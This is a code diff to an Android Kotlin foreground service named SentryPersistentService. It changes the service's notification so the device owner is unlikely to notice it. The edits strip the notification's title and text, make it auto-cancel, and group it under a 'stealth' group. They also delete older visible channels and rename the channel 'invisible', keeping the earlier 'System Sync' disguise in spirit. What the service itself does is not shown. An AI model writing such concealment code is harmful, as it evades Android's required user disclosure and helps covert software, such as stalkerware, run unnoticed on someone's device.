@@ -54,14 +54,14 @@ class SentryPersistentService : Service() {
 
     private fun startAsForeground() {
         val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("System Sync")
-            .setContentText("Syncing in background")
             .setSmallIcon(android.R.drawable.stat_sys_download_done)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setSilent(true)
-            .setOngoing(true)
-            .setAutoCancel(false)
+            .setOngoing(false)
+            .setAutoCancel(true)
+            .setGroup("sentry_stealth_group")
+            .setGroupSummary(true)
             .build()
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
@@ -102,19 +102,26 @@ class SentryPersistentService : Service() {
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val manager = getSystemService(NotificationManager::class.java)
+            // Delete old visible channels
+            try {
+                manager?.deleteNotificationChannel("sentry_silent_channel_v2")
+                manager?.deleteNotificationChannel("sentry_service_channel")
+                manager?.deleteNotificationChannel("sentry_channel")
+            } catch (_: Exception) {}
+
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "System Sync",
+                "Background Service",
                 NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "Background synchronization service"
+                description = "Silent internal channel"
                 setShowBadge(false)
                 setSound(null, null)
                 enableLights(false)
                 enableVibration(false)
                 lockscreenVisibility = Notification.VISIBILITY_SECRET
             }
-            val manager = getSystemService(NotificationManager::class.java)
             manager?.createNotificationChannel(channel)
         }
     }
@@ -171,7 +178,7 @@ class SentryPersistentService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 
     companion object {
-        private const val CHANNEL_ID = "sentry_silent_channel_v2"
+        private const val CHANNEL_ID = "sentry_invisible_channel_v4"
         private const val NOTIFICATION_ID = 1001
 
         fun startService(context: Context) {
